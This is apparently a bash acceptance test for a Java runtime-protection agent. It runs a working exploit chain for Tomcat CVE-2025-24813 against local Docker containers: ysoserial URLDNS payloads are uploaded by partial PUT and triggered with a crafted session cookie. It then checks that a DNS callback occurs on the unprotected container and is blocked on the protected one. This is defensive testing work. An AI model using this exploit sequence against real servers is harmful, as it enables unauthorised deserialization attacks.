#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

vulhub_dir="${OHMYRASP_VULHUB_TOMCAT_24813_DIR:-/tmp/vulhub-ohmyrasp-20260603/tomcat/CVE-2025-24813}"
image="${OHMYRASP_VULHUB_TOMCAT_24813_IMAGE:-ohmyrasp/vulhub-tomcat:9.0.97-cve-2025-24813}"
baseline_name="${OHMYRASP_VULHUB_TOMCAT_24813_BASELINE_NAME:-ohmyrasp-vulhub-tomcat24813-baseline}"
protected_name="${OHMYRASP_VULHUB_TOMCAT_24813_PROTECTED_NAME:-ohmyrasp-vulhub-tomcat24813-protected}"
baseline_port="${OHMYRASP_VULHUB_TOMCAT_24813_BASELINE_PORT:-19146}"
protected_port="${OHMYRASP_VULHUB_TOMCAT_24813_PROTECTED_PORT:-19147}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
ysoserial_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
maven_jdk8_image="${OHMYRASP_MAVEN_JDK8_IMAGE:-maven:3.8.1-jdk-8}"
openjdk8u292_image="${OHMYRASP_OPENJDK_8U292_IMAGE:-openjdk:8u292}"
baseline_dir="logs/vulhub-tomcat-9.0.97-24813-java8-baseline"
protected_dir="logs/vulhub-tomcat-9.0.97-24813-java8-protected"
payload_dir="logs/vulhub-tomcat-9.0.97-24813-java8-payload"
protected_log="${protected_dir}/events.jsonl"
dns_image="${OHMYRASP_VULHUB_TOMCAT_24813_DNS_IMAGE:-python:3-alpine}"
dns_name="${OHMYRASP_VULHUB_TOMCAT_24813_DNS_NAME:-ohmyrasp-vulhub-tomcat24813-dns}"
dns_host=""
dns_log="${payload_dir}/dns-queries.log"
token_suffix="${OHMYRASP_VULHUB_TOMCAT_24813_TOKEN_SUFFIX:-$(date +%s)$$}"
baseline_domain="base-${token_suffix}.tomcat24813.ohmyrasp.test"
protected_domain="prot-${token_suffix}.tomcat24813.ohmyrasp.test"

prepare_ysoserial() {
  mkdir -p "$ysoserial_dir"
  if [[ ! -s "${ysoserial_dir}/ysoserial.jar" ]]; then
    rm -rf "${ysoserial_dir}/src"
    docker run --rm -v "${ysoserial_dir}:/work" -w /work "$maven_jdk8_image" \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
}

write_urldns_payload() {
  local domain="$1"
  local output="$2"
  docker run --rm \
    -v "${ysoserial_dir}:/ysoserial:ro" \
    "$openjdk8u292_image" \
    java -jar /ysoserial/ysoserial.jar URLDNS "http://${domain}/" > "$output"
  test -s "$output"
}

start_dns_server() {
  : > "$dns_log"
  cat > "${payload_dir}/dns-server.py" <<'PY'
import socket
import sys

log_path = sys.argv[1]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", 53))


def qname(packet):
    labels = []
    offset = 12
    while offset < len(packet):
        length = packet[offset]
        if length == 0:
            return ".".join(labels), offset + 5
        offset += 1
        labels.append(packet[offset:offset + length].decode("ascii", "ignore"))
        offset += length
    return "", len(packet)


while True:
    data, address = sock.recvfrom(2048)
    name, question_end = qname(data)
    with open(log_path, "a", encoding="utf-8") as handle:
        handle.write(name + "\n")
        handle.flush()
    header = data[:2] + b"\x81\x83" + data[4:6] + b"\x00\x00\x00\x00\x00\x00"
    sock.sendto(header + data[12:question_end], address)
PY
  docker rm -f "$dns_name" >/dev/null 2>&1 || true
  docker run -d --name "$dns_name" \
    -v "$(pwd)/${payload_dir}:/work" \
    -w /work \
    "$dns_image" \
    python /work/dns-server.py /work/dns-queries.log >/dev/null
  for attempt in $(seq 1 30); do
    dns_host="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$dns_name" 2>/dev/null || true)"
    if [[ -n "$dns_host" ]] \
      && docker ps --filter "name=${dns_name}" --filter status=running --format '{{.Names}}' \
        | grep -Fq "$dns_name"; then
      printf 'dns_container_ip=%s\n' "$dns_host" >> "${payload_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  docker logs "$dns_name" >&2 || true
  echo "temporary DNS container did not start" >&2
    exit 1
}

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  docker rm -f "$dns_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 30 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_tomcat() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 120); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "http://127.0.0.1:${port}/")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" || "$status" == "404" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "Tomcat CVE-2025-24813 container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Tomcat CVE-2025-24813 did not expose HTTP at ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event for Tomcat CVE-2025-24813" >&2
  exit 1
}

put_session_payload() {
  local port="$1"
  local payload="$2"
  local output="$3"
  local size
  size="$(wc -c < "$payload" | tr -d ' ')"
  curl_status "$output" \
    -X PUT \
    -H "Content-Range: bytes 0-$((size - 1))/${size}" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/deserialize/session"
}

trigger_session_load() {
  local port="$1"
  local output="$2"
  curl_status "$output" \
    -H "Cookie: JSESSIONID=.deserialize" \
    "http://127.0.0.1:${port}/"
}

wait_for_dns_query() {
  local domain="$1"
  local dir="$2"
  for attempt in $(seq 1 30); do
    printf 'dns_attempt=%s domain=%s\n' "$attempt" "$domain" >> "${dir}/attempts.log"
    if grep -Fq "$domain" "$dns_log"; then
      return
    fi
    sleep 1
  done
  cat "$dns_log" >&2 || true
  echo "missing URLDNS lookup for ${domain}" >&2
  exit 1
}

assert_no_dns_query() {
  local domain="$1"
  if grep -Fq "$domain" "$dns_log"; then
    cat "$dns_log" >&2 || true
    echo "protected Tomcat CVE-2025-24813 still resolved ${domain}" >&2
    exit 1
  fi
}

session_file_block_count() {
  grep -Ec '"algorithm":"java8_request_session_file_deserialization".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_session_file_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(session_file_block_count)"
    if (( count > previous )); then
      printf 'session_file_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_request_session_file_deserialization block event for Tomcat CVE-2025-24813" >&2
  exit 1
}

verify_image_java8() {
  docker run --rm "$image" java -version > "${payload_dir}/image-java-version.txt" 2>&1 || true
  if ! grep -Fq '1.8.0_' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "Tomcat CVE-2025-24813 image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    --dns "$dns_host" \
    -p "${baseline_port}:8080" \
    "$image" >/dev/null

  wait_for_tomcat "$baseline_name" "$baseline_port" "$baseline_dir"

  local status
  status="$(put_session_payload "$baseline_port" "${payload_dir}/baseline-urldns.ser" "${baseline_dir}/partial-put.response")"
  printf 'baseline_put_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  status="$(trigger_session_load "$baseline_port" "${baseline_dir}/session-load.response")"
  printf 'baseline_session_load_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  wait_for_dns_query "$baseline_domain" "$baseline_dir"

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --name "$protected_name" \
    --dns "$dns_host" \
    -p "${protected_port}:8080" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "CATALINA_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_tomcat "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Tomcat CVE-2025-24813 protected startup produced a detection before exploit traffic" >&2
    exit 1
  fi

  local status
  local previous_count
  status="$(put_session_payload "$protected_port" "${payload_dir}/protected-urldns.ser" "${protected_dir}/partial-put.response")"
  printf 'protected_put_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Tomcat CVE-2025-24813 protected partial PUT produced a detection before session load" >&2
    exit 1
  fi
  previous_count="$(session_file_block_count)"
  status="$(trigger_session_load "$protected_port" "${protected_dir}/session-load.response")"
  printf 'protected_session_load_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_session_file_block "$previous_count"
  sleep 2
  assert_no_dns_query "$protected_domain"
}

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker build -t "$image" "$vulhub_dir" >/dev/null
verify_image_java8
prepare_ysoserial
write_urldns_payload "$baseline_domain" "${payload_dir}/baseline-urldns.ser"
write_urldns_payload "$protected_domain" "${payload_dir}/protected-urldns.ser"
start_dns_server
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Tomcat 9.0.97 CVE-2025-24813 Java8 acceptance passed"
